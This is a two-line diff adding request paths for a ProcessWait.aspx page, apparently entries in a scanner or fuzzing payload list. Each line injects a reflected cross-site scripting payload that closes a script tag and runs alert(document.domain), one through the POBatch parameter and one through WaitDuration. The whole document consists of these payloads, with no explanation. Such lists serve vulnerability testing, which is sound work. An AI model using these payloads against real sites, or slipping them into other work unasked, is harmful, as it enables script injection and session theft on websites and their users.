@@ -1,0 +1,2 @@
+/ProcessWait.aspx?POBatch=test&WaitDuration=</script><script>alert(document.domain)</script>
+/ProcessWait.aspx?POBatch=</script><script>alert(document.domain)</script>&WaitDuration=3
